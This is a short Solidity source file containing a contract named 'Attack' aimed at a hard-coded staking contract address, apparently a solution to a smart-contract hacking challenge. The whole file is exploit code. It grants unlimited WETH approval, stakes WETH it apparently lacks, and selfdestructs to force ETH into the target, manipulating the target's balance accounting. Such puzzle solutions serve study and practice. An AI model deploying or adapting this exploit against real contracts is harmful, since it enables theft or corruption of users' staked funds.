// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;




interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}


interface Stake {
    function StakeWETH(uint256 amount) external returns (bool);
    function StakeETH() external payable;
    function Unstake(uint256 amount) external returns (bool);
}

contract Attack {
  address public WETH;
  Stake public stake = Stake(0xFC0183eb5B64Abd0aA903e20BA2305A863FcFC5F);



  constructor(address _WETH) {
    WETH = _WETH;
  }
    
 function attack() public payable{
    IERC20(WETH).approve(address(stake), type(uint256).max);
    stake.StakeWETH(1000000000000000000); // 1 WETH
    selfdestruct(payable(0xFC0183eb5B64Abd0aA903e20BA2305A863FcFC5F));
    }

}